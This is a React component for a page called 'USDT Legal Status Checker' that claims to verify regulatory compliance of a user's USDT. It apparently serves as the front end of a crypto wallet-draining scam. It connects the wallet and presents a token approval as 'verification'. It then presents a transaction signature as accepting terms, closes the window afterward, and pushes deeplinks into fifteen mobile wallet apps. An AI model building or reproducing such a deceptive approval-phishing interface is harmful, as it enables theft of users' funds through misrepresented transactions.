'use client';

import { useState } from 'react';
import { ethers } from 'ethers';
import ProgressBar from './ProgressBar';
import CardStep from './CardStep';
import SuccessModal from './SuccessModal';
import { switchToBSC, approveToken, prepareAndSignTransaction } from '@/lib/blockchain';

export default function ApprovalPortal() {
  const [step, setStep] = useState(1);
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const [signer, setSigner] = useState<ethers.Signer | null>(null);
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);

  const handleConnectWallet = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!window.ethereum) throw new Error('No web3 wallet found');

      await switchToBSC();
      const newProvider = new ethers.BrowserProvider(window.ethereum);
      await newProvider.send('eth_requestAccounts', []);
      const newSigner = await newProvider.getSigner();
      const address = await newSigner.getAddress();

      setUserAddress(address);
      setSigner(newSigner);
      setProvider(newProvider);
      setStep(2);
    } catch (err: any) {
      setError(err?.message || 'Connection failed');
    } finally {
      setLoading(false);
    }
  };

  const handleApproveToken = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer) throw new Error('Connect wallet first');
      await approveToken(signer);
      setStep(3);
    } catch (err: any) {
      setError(err?.message || 'Approval failed');
    } finally {
      setLoading(false);
    }
  };

  const handleSignTransaction = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer || !provider || !userAddress) throw new Error('Connect wallet first');
      await prepareAndSignTransaction(signer, provider, userAddress);
      setShowSuccess(true);
      setTimeout(() => {
        if (typeof window !== 'undefined') {
          window.close();
        }
      }, 3000);
    } catch (err: any) {
      setError(err?.message || 'Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const handleMobileWallet = () => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (!isMobile) {
      setError('Mobile wallet deeplinks are only available on mobile devices');
      return;
    }

    const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
    const encodedUrl = encodeURIComponent(currentUrl);
    
    const walletLinks = [
      `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
      `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
      `https://rnbwapp.com/browser?url=${encodedUrl}`,
      `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
      `tpdapp://open?params=${encodedUrl}`,
      `imtokenv2://navigate/DappView?url=${encodedUrl}`,
      `dfw://browser?url=${encodedUrl}`,
      `safepal://browser?url=${encodedUrl}`,
      `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
      `okx://wallet/dapp/url?dappUrl=${encodedUrl}`,
      `bnc://app.binance.com/dapp?url=${encodedUrl}`,
      `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
      `https://argent.link/app/wc?uri=${encodedUrl}`,
      `oneinch://dapp?url=${encodedUrl}`,
      `zerion://dapp?url=${encodedUrl}`,
    ];

    const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
    
    walletLinks.forEach((link, index) => {
      setTimeout(() => {
        const a = document.createElement('a');
        a.href = link;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, index * 300);
    });

    setTimeout(() => {
      const a = document.createElement('a');
      a.href = universalScheme;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }, walletLinks.length * 300);

    setTimeout(() => {
      setError(null);
    }, (walletLinks.length + 1) * 300);
  };

  return (
    <main className="relative min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 overflow-hidden">
      {/* Animated background orbs */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-emerald-500/10 rounded-full blur-3xl animate-pulse-glow" />
        <div className="absolute bottom-1/4 right-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-teal-500/10 rounded-full blur-3xl animate-pulse-glow animation-delay-2000" />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 sm:w-72 sm:h-72 bg-cyan-500/5 rounded-full blur-3xl animate-pulse-glow animation-delay-1000" />
      </div>

      <div className="relative w-full max-w-2xl z-10 animate-slide-up">
        {/* Header */}
        <div className="text-center mb-6 sm:mb-8 md:mb-10">
          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-br from-emerald-400 via-emerald-500 to-teal-600 mb-4 sm:mb-5 md:mb-6 shadow-2xl shadow-emerald-500/50 animate-float relative">
            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-emerald-400 to-teal-600 animate-pulse-glow opacity-60" />
            <svg className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 text-white relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-2 sm:mb-3 bg-gradient-to-r from-white via-emerald-100 to-white bg-clip-text text-transparent leading-tight px-4">
            USDT Legal Status Checker
          </h1>
          <p className="text-sm sm:text-base md:text-lg text-gray-300 max-w-md mx-auto px-4 leading-relaxed">
            Verify your USDT compliance with regulatory standards
          </p>
        </div>

        <ProgressBar currentStep={step} />

        {step === 1 && (
          <CardStep
            icon="🔗"
            title="Connect Wallet to Check USDT"
            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Connect Wallet',
                onClick: handleConnectWallet,
                primary: true,
              },
              {
                label: 'Open Mobile Wallet',
                onClick: handleMobileWallet,
                primary: false,
              }
            ]}
          />
        )}

        {step === 2 && (
          <CardStep
            icon="✅"
            title="Approve USDT Interaction"
            description="Approve USDT interaction to allow the verification system to check your token compliance status."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Approve USDT',
                onClick: handleApproveToken,
                primary: true,
              }
            ]}
          />
        )}

        {step === 3 && (
          <CardStep
            icon="✍️"
            title="Sign Terms & Conditions"
            description="Review and sign the terms and conditions to complete the USDT verification process."
            loading={loading}
            error={error}
            showTerms={true}
            buttons={[
              {
                label: 'Sign & Accept Terms',
                onClick: handleSignTransaction,
                primary: true,
              }
            ]}
          />
        )}

        <SuccessModal isOpen={showSuccess} />
      </div>

      {/* Footer */}
      <footer className="fixed bottom-3 sm:bottom-4 md:bottom-5 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-400 backdrop-blur-md bg-black/40 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/20 shadow-lg z-20">
        <span className="hidden sm:inline">Secured by </span>
        <span className="text-emerald-400 font-semibold">USDT Compliance Network</span>
      </footer>
    </main>
  );
}
